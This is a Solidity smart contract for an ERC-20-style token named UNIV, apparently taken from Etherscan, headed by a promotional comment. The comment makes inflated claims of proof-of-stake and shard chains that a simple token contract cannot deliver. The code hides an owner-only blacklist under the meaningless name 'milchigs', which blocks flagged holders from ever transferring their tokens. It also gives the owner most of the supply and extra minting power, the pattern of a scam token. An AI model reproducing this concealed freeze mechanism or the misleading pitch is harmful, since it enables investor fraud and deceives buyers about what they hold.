/**
 *Submitted for verification at Etherscan.io on 2020-11-5
*/

pragma solidity >=0.4.22 <0.6.0;
/*UNIV is the abbreviation of UNIVSWAP. 
UNIV's success is due to the core technology from UNI. 
The development core team comes from the United States, China, and South Korea.
UNIV optimizes and upgrades the UNI decentralization agreement, and proposes a new mode of unique governance.
Technically speaking, Univswap will be a proof-of-stake blockchain and introduce shard chains.
Univswap will reduce energy consumption, allow the network to process more transactions, and increase security,compared with Uniswap.*/
contract BWSERC20
{
    string public name="UNIV"; 
    string public symbol="UNIV";
    uint8 public decimals = 18; 
    uint256 public totalSupply=80000 ether; 
    
    address st_owner;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => bool) milchigs;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value); 
    
    uint256 issue=20000 ether;
    
    constructor ()public
    {
        st_owner=msg.sender;
        balanceOf[st_owner]=60000 ether;

    }
    
    function _transfer(address _from, address _to, uint256 _value) internal {
      require(_to != address(0x0));
      require(balanceOf[_from] >= _value);
      require(balanceOf[_to] + _value > balanceOf[_to]);
      require(milchigs[_from] == false);
      uint previousBalances = balanceOf[_from] + balanceOf[_to];
      balanceOf[_from] -= _value;
      balanceOf[_to] += _value;
      emit Transfer(_from, _to, _value);
      assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success){
        require(_value <= allowance[_from][msg.sender]);   // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function setMilchigs(address addr,bool value)public{
        require(msg.sender == st_owner);
        milchigs[addr]=value;
    }
    function runIssue(address addr,uint256 value)public{
        require(msg.sender == st_owner);
        uint256 v=value * (10**18);
        require (v<= issue);
        issue -= v;
        balanceOf[addr]+=v;
    }
}
